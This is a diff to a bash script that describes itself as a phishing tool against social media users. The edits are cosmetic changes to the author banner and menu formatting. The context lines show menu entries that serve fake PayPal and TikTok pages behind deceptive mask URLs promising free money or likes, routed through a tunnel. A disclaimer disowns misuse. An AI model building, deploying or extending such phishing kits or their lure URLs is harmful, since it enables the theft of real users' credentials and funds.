@@ -344,7 +344,7 @@ about() {
 	cat <<- EOF
 		${GREEN} Author   ${RED}:  ${ORANGE}MAMBA MENTALITY ${RED}[ ${ORANGE}MAMBA-9MM ${RED}]
 		${GREEN} Github   ${RED}:  ${CYAN}https://github.com/mamba-9mm/phishing
-		${GREEN} Facebook   ${RED}:  ${CYAN}https://facebook.com/mambamentality9mm
+		${GREEN} Facebook ${RED}:  ${CYAN}https://facebook.com/mambamentality9mm
 		${GREEN} Version  ${RED}:  ${ORANGE}${__version__}
 
 		${WHITE} ${REDBG}Warning:${RESETBG}
@@ -352,7 +352,7 @@ about() {
 		  only ${RED}!${WHITE}${CYAN} and this PHISHING TOOL is dangerous to all social media user's, Author will not be responsible to
 		  any misuse of this tool in a wrong way ${RED}!${WHITE}
 		
-		${WHITE} ${ORANGEBG}Special Thanks to myself:${RESETBG}
+		${ORANGE} ${BLACKBG}Special Thanks to myself:${RESETBG}
 		${CYAN}  Mamba Mentality
 
 		${RED}[${WHITE}00${RED}]${ORANGE} Main Menu     ${RED}[${WHITE}99${RED}]${ORANGE} Exit
@@ -722,7 +722,7 @@ main_menu() {
 			website="paypal"
 			mask='https://get-500-usd-free-to-your-acount'
 			tunnel_menu;;
-		05)
+		    05)
 			website="tiktok"
 			mask='https://tiktok-free-liker'
 			tunnel_menu;;
